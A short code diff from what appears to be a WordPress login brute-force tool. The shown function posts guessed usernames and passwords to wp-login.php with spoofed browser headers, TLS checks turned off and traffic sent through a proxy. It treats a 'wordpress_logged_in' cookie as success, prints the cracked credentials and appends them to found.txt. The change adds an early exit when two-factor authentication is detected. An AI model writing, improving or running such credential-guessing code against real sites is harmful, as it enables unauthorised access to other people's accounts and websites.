@@ -116,6 +116,9 @@ def test_login (url,user,password,cnt,attempts):
 	headers = {"Origin":""+url+"","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/x-www-form-urlencoded"}
 	cookies = {"wordpress_test_cookie":"WP+Cookie+check"}
 	response = session.post(""+url+"/wp-login.php?redirect_to="+url+"/wp-admin/", data=paramsPost, headers=headers, cookies=cookies,verify=False, proxies=proxyDict,allow_redirects = False)
+	if "Google Authenticator code" in response.text:
+		print("[-] 2FA is enabled Sorry [-]")
+		sys.exit(0)
 	if "wordpress_logged_in" in response.headers['Set-Cookie']:
 		print("[+] Found Login Username: "+user+" Password: "+password+" on attempt "+str(cnt)+" [+]")
 		text_file = open("found.txt", "a")
